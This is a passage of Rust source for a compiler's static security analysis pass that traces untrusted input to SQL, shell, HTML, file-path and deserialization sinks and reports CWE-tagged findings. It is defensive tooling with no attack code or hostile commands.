//! SAST Taint Analysis compiler pass.
//!
//! Detects taint-flow vulnerabilities by tracking data from untrusted sources
//! (HTTP handlers, fetch results, user input) through to dangerous sinks
//! (SQL queries, shell commands, HTML output, file paths, deserialization).
//!
//! Functions annotated with `@sanitizer` are treated as taint cleansers —
//! data returned from a sanitizer is no longer considered tainted.
//!
//! Error codes (E22xx range — E21xx is taken by safety_pass):
//! - E2200: Tainted data flows to SQL query sink (SQL injection)
//! - E2201: Tainted data flows to shell command sink (command injection)
//! - E2202: Tainted data flows to HTML output sink (XSS)
//! - E2203: Tainted data flows to file path sink (path traversal)
//! - E2204: Tainted data flows to deserialization sink
//! - E2205: @sanitizer function missing return statement
//! - W2200: Tainted data used without sanitization (general warning)
//! - W2201: Interprocedural taint flow detected

use std::collections::{HashMap, HashSet};

use crate::ast::*;
use crate::error::Diagnostics;
use crate::lexer::Span;

// ── Sink Classification ────────────────────────────────────────────────────

/// Classification of dangerous sinks that tainted data should not reach.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum SinkKind {
    /// SQL query functions (SQL injection — CWE-89)
    Sql,
    /// Shell/command execution (command injection — CWE-78)
    Command,
    /// HTML rendering/output (XSS — CWE-79)
    Html,
    /// File path operations (path traversal — CWE-22)
    FilePath,
    /// Deserialization (insecure deserialization — CWE-502)
    Deserialize,
}

impl SinkKind {
    /// Error code for this sink kind.
    fn error_code(&self) -> &'static str {
        match self {
            SinkKind::Sql => "E2200",
            SinkKind::Command => "E2201",
            SinkKind::Html => "E2202",
            SinkKind::FilePath => "E2203",
            SinkKind::Deserialize => "E2204",
        }
    }

    /// Human-readable description for diagnostic messages.
    fn description(&self) -> &'static str {
        match self {
            SinkKind::Sql => "SQL query sink (potential SQL injection)",
            SinkKind::Command => "shell command sink (potential command injection)",
            SinkKind::Html => "HTML output sink (potential XSS)",
            SinkKind::FilePath => "file path sink (potential path traversal)",
            SinkKind::Deserialize => "deserialization sink (potential insecure deserialization)",
        }
    }

    /// CWE identifier for SARIF output.
    fn cwe_id(&self) -> &'static str {
        match self {
            SinkKind::Sql => "CWE-89",
            SinkKind::Command => "CWE-78",
            SinkKind::Html => "CWE-79",
            SinkKind::FilePath => "CWE-22",
            SinkKind::Deserialize => "CWE-502",
        }
    }

    /// CWE name for SARIF output.
    fn cwe_name(&self) -> &'static str {
        match self {
            SinkKind::Sql => {
                "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')"
            }
            SinkKind::Command => {
                "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
            }
            SinkKind::Html => {
                "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
            }
            SinkKind::FilePath => {
                "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
            }
            SinkKind::Deserialize => "Deserialization of Untrusted Data",
        }
    }
}

/// Classify a function/method name as a sink kind, if applicable.
fn classify_sink(name: &str) -> Option<SinkKind> {
    let lower = name.to_lowercase();

    // SQL sinks
    if lower.contains("sql")
        || lower.contains("query")
        || lower == "execute"
        || lower == "raw_query"
        || lower == "exec_sql"
    {
        return Some(SinkKind::Sql);
    }

    // Command/shell sinks
    if lower.contains("shell")
        || lower.contains("system")
        || lower == "exec"
        || lower == "eval"
        || lower == "popen"
        || lower == "spawn"
        || lower == "run_command"
        || lower == "command"
    {
        return Some(SinkKind::Command);
    }

    // HTML sinks
    if lower.contains("html")
        || lower.contains("render")
        || lower == "inner_html"
        || lower == "set_html"
        || lower == "write_html"
    {
        return Some(SinkKind::Html);
    }

    // File path sinks
    if lower == "open"
        || lower == "read_file"
        || lower == "write_file"
        || lower == "read_dir"
        || lower == "remove_file"
        || lower == "create_file"
    {
        return Some(SinkKind::FilePath);
    }

    // Deserialization sinks
    if lower.contains("deserialize")
        || lower == "from_json"
        || lower == "from_yaml"
        || lower == "from_toml"
        || lower == "from_xml"
        || lower == "from_msgpack"
        || lower == "unmarshal"
        || lower == "pickle_load"
    {
        return Some(SinkKind::Deserialize);
    }

    None
}

/// Check whether a function is an HTTP handler (its params are taint sources).
fn is_http_handler(f: &FnDecl) -> bool {
    // Functions with @http_handler annotation
    for ann in &f.annotations {
        let lower = ann.name.to_lowercase();
        if lower == "http_handler"
            || lower == "get"
            || lower == "post"
            || lower == "put"
            || lower == "delete"
            || lower == "patch"
            || lower == "route"
            || lower == "api"
            || lower == "endpoint"
        {
            return true;
        }
    }

    // Functions whose name suggests HTTP handling
    let lower = f.name.to_lowercase();
    if lower.starts_with("handle_") || lower.starts_with("api_") || lower.starts_with("endpoint_") {
        return true;
    }

    // Functions with common HTTP request parameter types
    for p in &f.params {
        if let TypeExprKind::Named(ref ty_name) = p.ty.kind {
            let lower_ty = ty_name.to_lowercase();
            if lower_ty == "request" || lower_ty == "httprequest" || lower_ty == "req" {
                return true;
            }
        }
    }

    false
}

/// Check whether a function has an `@source` annotation.
fn has_source_annotation(f: &FnDecl) -> bool {
    f.annotations.iter().any(|a| a.name == "source")
}

/// Check whether a function has a `@sink` annotation, and if so, return the sink kind.
fn get_sink_annotation(f: &FnDecl) -> Option<SinkKind> {
    for ann in &f.annotations {
        if ann.name == "sink" {
            // Check the kind argument if present
            for arg in &ann.args {
                if arg.name == "kind" {
                    if let ExprKind::DotIdent(ref val) = arg.value.kind {
                        return match val.as_str() {
                            "sql" => Some(SinkKind::Sql),
                            "command" | "shell" => Some(SinkKind::Command),
                            "html" | "xss" => Some(SinkKind::Html),
                            "file" | "path" => Some(SinkKind::FilePath),
                            "deserialize" | "deser" => Some(SinkKind::Deserialize),
                            _ => None,
                        };
                    }
                }
            }
            // Default to general warning if no kind specified
            return None;
        }
    }
    None
}

/// Check whether a function has a `@sink` annotation at all.
fn has_sink_annotation(f: &FnDecl) -> bool {
    f.annotations.iter().any(|a| a.name == "sink")
}

/// Check whether a function has a `@sanitizer` annotation.
fn has_sanitizer_annotation(f: &FnDecl) -> bool {
    f.annotations.iter().any(|a| a.name == "sanitizer")
}

// ── Taint Source Info ─────────────────────────────────────────────────────

/// Information about the origin of taint for a variable.
#[derive(Debug, Clone)]
struct TaintSource {
    /// Name of the variable at the source.
    source_var: String,
    /// Span of the taint source.
    source_span: Span,
    /// How many propagation steps from the original source.
    depth: u32,
}

// ── SAST Pass ─────────────────────────────────────────────────────────────

/// Static Application Security Testing pass.
///
/// Performs intraprocedural and limited interprocedural taint analysis to
/// detect data flowing from untrusted sources to dangerous sinks without
/// passing through a sanitizer.
pub struct SastPass<'a> {
    program: &'a Program,
    pub diags: Diagnostics,

    /// Per-function taint sets: fn_name -> set of tainted variable names.
    tainted_vars: HashMap<String, HashMap<String, TaintSource>>,

    /// Functions annotated with `@sanitizer`.
    sanitizers: HashSet<String>,

    /// Functions annotated with `@source` (their return values are tainted).
    source_fns: HashSet<String>,

    /// Functions annotated with `@sink` + their sink kind.
    sink_fns: HashMap<String, Option<SinkKind>>,

    /// Maximum interprocedural taint depth.
    max_depth: u32,

    /// Collected findings for SARIF output.
    findings: Vec<SarifFinding>,
}

/// A single finding for SARIF output.
#[derive(Debug, Clone)]
pub struct SarifFinding {
    pub rule_id: String,
    pub message: String,
    pub level: String, // "error" or "warning"
    pub span: Span,
    pub cwe_id: Option<String>,
    pub cwe_name: Option<String>,
    pub source_var: Option<String>,
    pub sink_fn: Option<String>,
}

impl<'a> SastPass<'a> {
    pub fn new(program: &'a Program) -> Self {
        Self {
            program,
            diags: Diagnostics::new(),
            tainted_vars: HashMap::new(),
            sanitizers: HashSet::new(),
            source_fns: HashSet::new(),
            sink_fns: HashMap::new(),
            max_depth: 5,
            findings: Vec::new(),
        }
    }

    /// Run the full SAST taint analysis. Returns diagnostics.
    pub fn check(mut self) -> Diagnostics {
        // Phase 1: Collect annotations
        self.collect_phase();

        // Phase 2: Validate sanitizer functions
        self.validate_sanitizers();

        // Phase 2b: Analyze taint flow
        self.analyze_phase();

        self.diags
    }

    /// Run the full SAST taint analysis and return both diagnostics and findings.
    pub fn check_with_findings(mut self) -> (Diagnostics, Vec<SarifFinding>) {
        self.collect_phase();
        self.validate_sanitizers();
        self.analyze_phase();
        (self.diags, self.findings)
    }

    // ── Phase 1: Collect ──────────────────────────────────────────────────

    fn collect_phase(&mut self) {
        for item in &self.program.items {
            match item {
                Item::Fn(f) => self.collect_fn(f),
                Item::Impl(imp) => {
                    for m in &imp.methods {
                        self.collect_fn(m);
                    }
                }
                _ => {}
            }
        }
    }

    fn collect_fn(&mut self, f: &FnDecl) {
        // Check for @sanitizer
        if has_sanitizer_annotation(f) {
            self.sanitizers.insert(f.name.clone());
        }

        // Check for @source
        if has_source_annotation(f) {
            self.source_fns.insert(f.name.clone());
        }

        // Check for @sink
        if has_sink_annotation(f) {
            self.sink_fns.insert(f.name.clone(), get_sink_annotation(f));
        }
    }

    // ── Sanitizer Validation ──────────────────────────────────────────────

    fn validate_sanitizers(&mut self) {
        for item in &self.program.items {
            match item {
                Item::Fn(f) => {
                    if has_sanitizer_annotation(f) {
                        self.validate_sanitizer_fn(f);
                    }
                }
                Item::Impl(imp) => {
                    for m in &imp.methods {
                        if has_sanitizer_annotation(m) {
                            self.validate_sanitizer_fn(m);
                        }
                    }
                }
                _ => {}
            }
        }
    }

    fn validate_sanitizer_fn(&mut self, f: &FnDecl) {
        // A sanitizer must have at least one return statement (or implicit return)
        if f.body.stmts.is_empty() {
            self.diags.error(
                "E2205",
                format!(
                    "@sanitizer function `{}` has empty body — must return sanitized data",
                    f.name
                ),
                f.span,
            );
            self.findings.push(SarifFinding {
                rule_id: "E2205".to_string(),
                message: format!(
                    "@sanitizer function `{}` has empty body — must return sanitized data",
                    f.name
                ),
                level: "error".to_string(),
                span: f.span,
                cwe_id: None,
                cwe_name: None,
                source_var: None,
                sink_fn: Some(f.name.clone()),
            });
            return;
        }

        // Check if there's a return statement or the last statement is an expression
        let has_return = self.block_has_return(&f.body);
        if !has_return {
            self.diags.error(
                "E2205",
                format!(
                    "@sanitizer function `{}` missing return statement — must return sanitized data",
                    f.name
                ),
                f.span,
            );
            self.findings.push(SarifFinding {
                rule_id: "E2205".to_string(),
                message: format!(
                    "@sanitizer function `{}` missing return statement — must return sanitized data",
                    f.name
                ),
                level: "error".to_string(),
                span: f.span,
                cwe_id: None,
                cwe_name: None,
                source_var: None,
                sink_fn: Some(f.name.clone()),
            });
        }
    }

    /// Check whether a block has an explicit return or an implicit return
    /// (last statement is an expression).
    fn block_has_return(&self, block: &Block) -> bool {
        if block.stmts.is_empty() {
            return false;
        }

        for stmt in &block.stmts {
            if matches!(stmt.kind, StmtKind::Return(_)) {
                return true;
            }
        }

        // Last statement is an expression (implicit return)
        if let Some(last) = block.stmts.last() {
            if matches!(last.kind, StmtKind::Expr { .. }) {
                return true;
            }
        }

        false
    }

    // ── Phase 2: Analyze ──────────────────────────────────────────────────

    fn analyze_phase(&mut self) {
        // Build function lookup for interprocedural analysis
        let fn_map: HashMap<String, &FnDecl> = self
            .program
            .items
            .iter()
            .filter_map(|item| {
                if let Item::Fn(f) = item {
                    Some((f.name.clone(), f))
                } else {
                    None
                }
            })
            .collect();

        // Also collect impl methods
        let mut impl_fn_map: HashMap<String, &FnDecl> = HashMap::new();
        for item in &self.program.items {
            if let Item::Impl(imp) = item {
                for m in &imp.methods {
                    impl_fn_map.insert(m.name.clone(), m);
                }
            }
        }

        // Analyze each function — even those without initial taint, because they
        // may acquire taint from fetch()/source function calls within their body.
        for item in &self.program.items {
            match item {
                Item::Fn(f) => {
                    if !self.sanitizers.contains(&f.name) {
                        let tainted = self.compute_initial_taint(f);
                        self.analyze_fn_body(f, &tainted, &fn_map, &impl_fn_map, 0);
                    }
                }
                Item::Impl(imp) => {
                    for m in &imp.methods {
                        if !self.sanitizers.contains(&m.name) {
                            let tainted = self.compute_initial_taint(m);
                            self.analyze_fn_body(m, &tainted, &fn_map, &impl_fn_map, 0);
                        }
                    }
                }
                _ => {}
            }
        }
    }

    /// Compute the initial set of tainted variables for a function.
    fn compute_initial_taint(&self, f: &FnDecl) -> HashMap<String, TaintSource> {
        let mut tainted = HashMap::new();

        // If it's an HTTP handler or has @source, all params are tainted
        if is_http_handler(f) || has_source_annotation(f) {
            for p in &f.params {
                tainted.insert(
                    p.name.clone(),
                    TaintSource {
                        source_var: p.name.clone(),
                        source_span: p.span,
                        depth: 0,
                    },
                );
            }
        }

        // Params with Untrusted<T> type are always tainted
        for p in &f.params {
            if is_untrusted_type(&p.ty) {
                tainted.insert(
                    p.name.clone(),
                    TaintSource {
                        source_var: p.name.clone(),
                        source_span: p.span,
                        depth: 0,
                    },
                );
            }
        }

        tainted
    }

    /// Analyze a function body for taint flow violations.
    fn analyze_fn_body(
        &mut self,
        f: &FnDecl,
        initial_taint: &HashMap<String, TaintSource>,
        fn_map: &HashMap<String, &FnDecl>,
        impl_fn_map: &HashMap<String, &FnDecl>,
        depth: u32,
    ) {
        let mut tainted = initial_taint.clone();

        // Store the tainted vars for this function
        let tainted_names: HashMap<String, TaintSource> = tainted.clone();
        self.tainted_vars.insert(f.name.clone(), tainted_names);

        // Walk statements
        for stmt in &f.body.stmts {
            self.analyze_stmt(stmt, &mut tainted, &f.name, fn_map, impl_fn_map, depth);
        }
    }

    /// Analyze a single statement for taint propagation and sink violations.
    fn analyze_stmt(
        &mut self,
        stmt: &Stmt,
        tainted: &mut HashMap<String, TaintSource>,
        fn_name: &str,
        fn_map: &HashMap<String, &FnDecl>,
        impl_fn_map: &HashMap<String, &FnDecl>,
        depth: u32,
    ) {
        match &stmt.kind {
            StmtKind::Let { name, value, .. } | StmtKind::Var { name, value, .. } => {
                // Check if the value expression uses any tainted variable
                if let Some(source) = self.expr_is_tainted(value, tainted, fn_map, impl_fn_map) {
                    // Propagate taint to the new variable
                    tainted.insert(
                        name.clone(),
                        TaintSource {
                            source_var: source.source_var.clone(),
                            source_span: source.source_span,
                            depth: source.depth + 1,
                        },
                    );
                }

                // Check if the value is a call to a source function
                if self.expr_calls_source(value) {
                    tainted.insert(
                        name.clone(),
                        TaintSource {
                            source_var: name.clone(),
                            source_span: value.span,
                            depth: 0,
                        },
                    );
                }

                // Also check if the value is a call to a fetch-like function
                if self.expr_calls_fetch(value) {
                    tainted.insert(
                        name.clone(),
                        TaintSource {
                            source_var: name.clone(),
                            source_span: value.span,
                            depth: 0,
                        },
                    );
                }

                // Check if value expression flows to a sink
                self.check_expr_sinks(value, tainted, fn_name, fn_map, impl_fn_map, depth);
            }

            StmtKind::LetDestructure { names, value } => {
                if let Some(source) = self.expr_is_tainted(value, tainted, fn_map, impl_fn_map) {
                    for name in names {
                        tainted.insert(
                            name.clone(),
                            TaintSource {
                                source_var: source.source_var.clone(),
                                source_span: source.source_span,
                                depth: source.depth + 1,
                            },
                        );
                    }
                }
                self.check_expr_sinks(value, tainted, fn_name, fn_map, impl_fn_map, depth);
            }

            StmtKind::Expr { expr } => {
                self.check_expr_sinks(expr, tainted, fn_name, fn_map, impl_fn_map, depth);
            }

            StmtKind::Return(Some(expr)) => {
                self.check_expr_sinks(expr, tainted, fn_name, fn_map, impl_fn_map, depth);
            }

            StmtKind::For {
                binding,
                iter,
                body,
                ..
            } => {
                // If iterator is tainted, binding variable is tainted
                if let Some(source) = self.expr_is_tainted(iter, tainted, fn_map, impl_fn_map) {
                    tainted.insert(
                        binding.clone(),
                        TaintSource {
                            source_var: source.source_var.clone(),
                            source_span: source.source_span,
                            depth: source.depth + 1,
                        },
                    );
                }
                self.check_expr_sinks(iter, tainted, fn_name, fn_map, impl_fn_map, depth);
                for s in &body.stmts {
                    self.analyze_stmt(s, tainted, fn_name, fn_map, impl_fn_map, depth);
                }
            }

            StmtKind::While { condition, body } => {
                self.check_expr_sinks(condition, tainted, fn_name, fn_map, impl_fn_map, depth);
                for s in &body.stmts {
                    self.analyze_stmt(s, tainted, fn_name, fn_map, impl_fn_map, depth);
                }
            }

            StmtKind::WhileLet { expr, body, .. } => {
                self.check_expr_sinks(expr, tainted, fn_name, fn_map, impl_fn_map, depth);
                for s in &body.stmts {
                    self.analyze_stmt(s, tainted, fn_name, fn_map, impl_fn_map, depth);
                }
            }

            StmtKind::Bail(expr) => {
                self.check_expr_sinks(expr, tainted, fn_name, fn_map, impl_fn_map, depth);
            }

            StmtKind::Loop { body } => {
                for s in &body.stmts {
                    self.analyze_stmt(s, tainted, fn_name, fn_map, impl_fn_map, depth);
                }
            }

            StmtKind::Return(None) | StmtKind::Break | StmtKind::Continue => {}
            StmtKind::Defer { .. } => {}
        }
    }

    /// Check whether an expression is tainted (uses tainted variables).
    /// Returns the taint source info if tainted, None otherwise.
    fn expr_is_tainted(
        &self,
        expr: &Expr,
        tainted: &HashMap<String, TaintSource>,
        fn_map: &HashMap<String, &FnDecl>,
        impl_fn_map: &HashMap<String, &FnDecl>,
    ) -> Option<TaintSource> {
        match &expr.kind {
            ExprKind::Ident(name) => tainted.get(name).cloned(),

            ExprKind::Binary { left, right, .. } => self
                .expr_is_tainted(left, tainted, fn_map, impl_fn_map)
                .or_else(|| self.expr_is_tainted(right, tainted, fn_map, impl_fn_map)),

            ExprKind::Unary { operand, .. } => {
                self.expr_is_tainted(operand, tainted, fn_map, impl_fn_map)
            }

            ExprKind::Call { callee, args } => {
                // If calling a sanitizer, the result is NOT tainted
                if let ExprKind::Ident(ref callee_name) = callee.kind {
                    if self.sanitizers.contains(callee_name) {
                        return None;
                    }
                    // If calling a source function, result IS tainted
                    if self.source_fns.contains(callee_name) {
                        return Some(TaintSource {
                            source_var: callee_name.clone(),
                            source_span: expr.span,
                            depth: 0,
                        });
                    }
                }
                // If any argument is tainted, the result is tainted
                for arg in args {
                    if let Some(src) =
                        self.expr_is_tainted(&arg.value, tainted, fn_map, impl_fn_map)
                    {
                        // But not if the call is to a sanitizer
                        if let ExprKind::Ident(ref callee_name) = callee.kind {
                            if self.sanitizers.contains(callee_name) {
                                return None;
                            }
                        }
                        return Some(TaintSource {
                            source_var: src.source_var,
                            source_span: src.source_span,
                            depth: src.depth + 1,
                        });
                    }
                }
                None
            }

            ExprKind::MethodCall {
                object,
                method,
                args,
            } => {
                // Check if method is a sanitizer
                if self.sanitizers.contains(method.as_str()) {
                    return None;
                }
                // If object is tainted, result is tainted (unless method is a sanitizer)
                if let Some(src) = self.expr_is_tainted(object, tainted, fn_map, impl_fn_map) {
                    return Some(TaintSource {
                        source_var: src.source_var,
                        source_span: src.source_span,
                        depth: src.depth + 1,
                    });
                }
                // If any arg is tainted, result is tainted
                for arg in args {
                    if let Some(src) =
                        self.expr_is_tainted(&arg.value, tainted, fn_map, impl_fn_map)
                    {
                        return Some(src);
                    }
                }
                None
            }

            ExprKind::FieldAccess { object, .. } => {
                self.expr_is_tainted(object, tainted, fn_map, impl_fn_map)
            }

            ExprKind::Index { object, index } => self
                .expr_is_tainted(object, tainted, fn_map, impl_fn_map)
                .or_else(|| self.expr_is_tainted(index, tainted, fn_map, impl_fn_map)),

            ExprKind::Try(inner) => self.expr_is_tainted(inner, tainted, fn_map, impl_fn_map),

            ExprKind::Await(inner) => self.expr_is_tainted(inner, tainted, fn_map, impl_fn_map),

            ExprKind::Interpolation(parts) => {
                for part in parts {
                    if let StringPart::Expr(e) = part {
                        if let Some(src) = self.expr_is_tainted(e, tainted, fn_map, impl_fn_map) {
                            return Some(src);
                        }
                    }
                }
                None
            }

            ExprKind::Array(items) => {
                for item in items {
                    if let Some(src) = self.expr_is_tainted(item, tainted, fn_map, impl_fn_map) {
                        return Some(src);
                    }
                }
                None
            }

            ExprKind::If {
                condition,
                then_block,
                else_branch,
            } => {
                if let Some(src) = self.expr_is_tainted(condition, tainted, fn_map, impl_fn_map) {
                    return Some(src);
                }
                for s in &then_block.stmts {
                    if let StmtKind::Expr { expr: e } = &s.kind {
                        if let Some(src) = self.expr_is_tainted(e, tainted, fn_map, impl_fn_map) {
                            return Some(src);
                        }
                    }
                }
                if let Some(ElseBranch::Block(block)) = else_branch {
                    for s in &block.stmts {
                        if let StmtKind::Expr { expr: e } = &s.kind {
                            if let Some(src) = self.expr_is_tainted(e, tainted, fn_map, impl_fn_map)
                            {
                                return Some(src);
                            }
                        }
                    }
                }
                None
            }

            ExprKind::Cast { expr: inner, .. } => {
                self.expr_is_tainted(inner, tainted, fn_map, impl_fn_map)
            }

            ExprKind::Assign { value, .. } => {
                self.expr_is_tainted(value, tainted, fn_map, impl_fn_map)
            }

            ExprKind::Block(block) => {
                // Last expression in block determines taint
                if let Some(last) = block.stmts.last() {
                    if let StmtKind::Expr { expr: e } = &last.kind {
                        return self.expr_is_tainted(e, tainted, fn_map, impl_fn_map);
                    }
                }
                None
            }

            // Literals and other non-tainted sources
            _ => None,
        }
    }

    /// Check whether an expression is a call to a known source function.
    fn expr_calls_source(&self, expr: &Expr) -> bool {
        match &expr.kind {
            ExprKind::Call { callee, .. } => {
                if let ExprKind::Ident(ref name) = callee.kind {
                    return self.source_fns.contains(name);
                }
                false
            }
            ExprKind::Try(inner) | ExprKind::Await(inner) => self.expr_calls_source(inner),
            _ => false,
        }
    }

    /// Check whether an expression is a call to fetch() or similar.
    fn expr_calls_fetch(&self, expr: &Expr) -> bool {
        match &expr.kind {
            ExprKind::Call { callee, .. } => {
                if let ExprKind::Ident(ref name) = callee.kind {
                    let lower = name.to_lowercase();
                    return lower == "fetch"
                        || lower == "http_get"
                        || lower == "http_post"
                        || lower == "readline"
                        || lower == "read_stdin"
                        || lower == "get_input"
                        || lower == "prompt"
                        || lower == "recv";
                }
                false
            }
            ExprKind::MethodCall { method, .. } => {
                let lower = method.to_lowercase();
                lower == "fetch"
                    || lower == "get"
                    || lower == "post"
                    || lower == "body"
                    || lower == "text"
                    || lower == "json"
            }
            ExprKind::Try(inner) | ExprKind::Await(inner) => self.expr_calls_fetch(inner),
            _ => false,
        }
    }

    /// Check an expression for sink calls that receive tainted data.
    fn check_expr_sinks(
        &mut self,
        expr: &Expr,
        tainted: &HashMap<String, TaintSource>,
        fn_name: &str,
        fn_map: &HashMap<String, &FnDecl>,
        impl_fn_map: &HashMap<String, &FnDecl>,
        depth: u32,
    ) {
        match &expr.kind {
            ExprKind::Call { callee, args } => {
                let callee_name = match &callee.kind {
                    ExprKind::Ident(n) => Some(n.as_str()),
                    _ => None,
                };

                if let Some(name) = callee_name {
                    // Sanitizer calls are never sinks, even if name matches a pattern
                    if self.sanitizers.contains(name) {
                        // Recurse into arguments only (they might contain nested sink calls)
                        for arg in args {
                            self.check_expr_sinks(
                                &arg.value,
                                tainted,
                                fn_name,
                                fn_map,
                                impl_fn_map,
                                depth,
                            );
                        }
                        return;
                    }

                    // Determine if this is a sink (by name or annotation)
                    let sink =
                        classify_sink(name).or_else(|| self.sink_fns.get(name).cloned().flatten());

                    if let Some(sink_kind) = sink {
                        // Check if any argument is tainted
                        for arg in args {
                            if let Some(source) =
                                self.expr_is_tainted(&arg.value, tainted, fn_map, impl_fn_map)
                            {
                                self.emit_sink_error(
                                    sink_kind,
                                    &source.source_var,
                                    name,
                                    fn_name,
                                    expr.span,
                                    source.source_span,
                                );
                            }
                        }
                    }

                    // Interprocedural: check if tainted args flow into another function
                    if depth < self.max_depth {
                        if let Some(callee_fn) = fn_map.get(name).or_else(|| impl_fn_map.get(name))
                        {
                            // Build a taint map for the callee based on which args are tainted
                            let mut callee_taint: HashMap<String, TaintSource> = HashMap::new();
                            for (i, arg) in args.iter().enumerate() {
                                if let Some(source) =
                                    self.expr_is_tainted(&arg.value, tainted, fn_map, impl_fn_map)
                                {
                                    if let Some(param) = callee_fn.params.get(i) {
                                        callee_taint.insert(
                                            param.name.clone(),
                                            TaintSource {
                                                source_var: source.source_var.clone(),
                                                source_span: source.source_span,
                                                depth: source.depth + 1,
                                            },
                                        );
                                    }
                                }
                            }
                            if !callee_taint.is_empty() {
                                // Emit interprocedural warning
                                for (param_name, source) in &callee_taint {
                                    self.diags.push(
                                        crate::error::Diagnostic::warning(
                                            "W2201",
                                            format!(
                                                "tainted data `{}` flows from `{}` into `{}` parameter `{}`",
                                                source.source_var, fn_name, name, param_name
                                            ),
                                            expr.span,
                                        )
                                        .with_help(
                                            "sanitize data before passing to other functions"
                                                .to_string(),
                                        ),
                                    );
                                    self.findings.push(SarifFinding {
                                        rule_id: "W2201".to_string(),
                                        message: format!(
                                            "tainted data `{}` flows from `{}` into `{}` parameter `{}`",
                                            source.source_var, fn_name, name, param_name
                                        ),
                                        level: "warning".to_string(),
                                        span: expr.span,
                                        cwe_id: None,
                                        cwe_name: None,
                                        source_var: Some(source.source_var.clone()),
                                        sink_fn: Some(name.to_string()),
                                    });
                                }
                                // Recursively analyze the callee
                                self.analyze_fn_body(
                                    callee_fn,
                                    &callee_taint,
                                    fn_map,
                                    impl_fn_map,
                                    depth + 1,
                                );
                            }
                        }
                    }
                }

                // Recurse into arguments (they might contain nested sink calls)
                for arg in args {
                    self.check_expr_sinks(&arg.value, tainted, fn_name, fn_map, impl_fn_map, depth);
                }
            }

            ExprKind::MethodCall {
                object,
                method,
                args,
            } => {
                // Check if method is a sink
                if let Some(sink_kind) = classify_sink(method) {
                    // Check if object or any arg is tainted
                    if let Some(source) = self.expr_is_tainted(object, tainted, fn_map, impl_fn_map)
                    {
                        self.emit_sink_error(
                            sink_kind,
                            &source.source_var,
                            method,
                            fn_name,
                            expr.span,
                            source.source_span,
                        );
                    }
                    for arg in args {
                        if let Some(source) =
                            self.expr_is_tainted(&arg.value, tainted, fn_map, impl_fn_map)
                        {
                            self.emit_sink_error(
                                sink_kind,
                                &source.source_var,
                                method,
                                fn_name,
                                expr.span,
                                source.source_span,
                            );
                        }
                    }
                }

                // Also check if annotated as @sink
                if let Some(Some(sink_kind)) = self.sink_fns.get(method.as_str()) {
                    let sink_kind = *sink_kind;
                    if let Some(source) = self.expr_is_tainted(object, tainted, fn_map, impl_fn_map)
                    {
                        self.emit_sink_error(
                            sink_kind,
                            &source.source_var,
                            method,
                            fn_name,
                            expr.span,
                            source.source_span,
                        );
                    }
                    for arg in args {
                        if let Some(source) =
                            self.expr_is_tainted(&arg.value, tainted, fn_map, impl_fn_map)
                        {
                            self.emit_sink_error(
                                sink_kind,
                                &source.source_var,
                                method,
                                fn_name,
                                expr.span,
                                source.source_span,
                            );
                        }
                    }
                }

                // Recurse into sub-expressions
                self.check_expr_sinks(object, tainted, fn_name, fn_map, impl_fn_map, depth);
                for arg in args {
                    self.check_expr_sinks(&arg.value, tainted, fn_name, fn_map, impl_fn_map, depth);
                }
            }

            ExprKind::Assign { target, value } => {
                // Track taint through assignment
                if let ExprKind::Ident(ref _name) = target.kind {
                    if let Some(_source) = self.expr_is_tainted(value, tainted, fn_map, impl_fn_map)
                    {
                        // This is a mutation — we can't easily modify the borrowed tainted map
                        // but we check the assignment value for sinks
                    }
                }
                self.check_expr_sinks(value, tainted, fn_name, fn_map, impl_fn_map, depth);
            }

            ExprKind::If {
                condition,
                then_block,
                else_branch,
            } => {
                self.check_expr_sinks(condition, tainted, fn_name, fn_map, impl_fn_map, depth);
                for s in &then_block.stmts {
                    self.analyze_stmt(s, &mut tainted.clone(), fn_name, fn_map, impl_fn_map, depth);
                }
                match else_branch {
                    Some(ElseBranch::Block(block)) => {
                        for s in &block.stmts {
                            self.analyze_stmt(
                                s,
                                &mut tainted.clone(),
                                fn_name,
                                fn_map,
                                impl_fn_map,
                                depth,
                            );
                        }
                    }
                    Some(ElseBranch::ElseIf(e)) => {
                        self.check_expr_sinks(e, tainted, fn_name, fn_map, impl_fn_map, depth);
                    }
                    None => {}
                }
            }

            ExprKind::Match { subject, arms } => {
                self.check_expr_sinks(subject, tainted, fn_name, fn_map, impl_fn_map, depth);
                for arm in arms {
                    self.check_expr_sinks(&arm.body, tainted, fn_name, fn_map, impl_fn_map, depth);
                }
            }

            ExprKind::Block(block) => {
                for s in &block.stmts {
                    self.analyze_stmt(s, &mut tainted.clone(), fn_name, fn_map, impl_fn_map, depth);
                }
            }

            ExprKind::Try(inner)
            | ExprKind::Await(inner)
            | ExprKind::Unary { operand: inner, .. } => {
                self.check_expr_sinks(inner, tainted, fn_name, fn_map, impl_fn_map, depth);
            }

            ExprKind::Binary { left, right, .. } => {
                self.check_expr_sinks(left, tainted, fn_name, fn_map, impl_fn_map, depth);
                self.check_expr_sinks(right, tainted, fn_name, fn_map, impl_fn_map, depth);
            }

            ExprKind::Index { object, index } => {
                self.check_expr_sinks(object, tainted, fn_name, fn_map, impl_fn_map, depth);
                self.check_expr_sinks(index, tainted, fn_name, fn_map, impl_fn_map, depth);
            }

            ExprKind::FieldAccess { object, .. } => {
                self.check_expr_sinks(object, tainted, fn_name, fn_map, impl_fn_map, depth);
            }

            ExprKind::Interpolation(parts) => {
                for part in parts {
                    if let StringPart::Expr(e) = part {
                        self.check_expr_sinks(e, tainted, fn_name, fn_map, impl_fn_map, depth);
                    }
                }
            }

            ExprKind::Array(items) => {
                for item in items {
                    self.check_expr_sinks(item, tainted, fn_name, fn_map, impl_fn_map, depth);
                }
            }

            ExprKind::Closure { body, .. } => {
                for s in body {
                    self.analyze_stmt(s, &mut tainted.clone(), fn_name, fn_map, impl_fn_map, depth);
                }
            }

            ExprKind::Cast { expr: inner, .. } => {
                self.check_expr_sinks(inner, tainted, fn_name, fn_map, impl_fn_map, depth);
            }

            ExprKind::StructLit { fields, spread, .. } => {
                for field in fields {
                    self.check_expr_sinks(
                        &field.value,
                        tainted,
                        fn_name,
                        fn_map,
                        impl_fn_map,
                        depth,
                    );
                }
                if let Some(s) = spread {
                    self.check_expr_sinks(s, tainted, fn_name, fn_map, impl_fn_map, depth);
                }
            }

            ExprKind::MapLit(entries) => {
                for (k, v) in entries {
                    self.check_expr_sinks(k, tainted, fn_name, fn_map, impl_fn_map, depth);
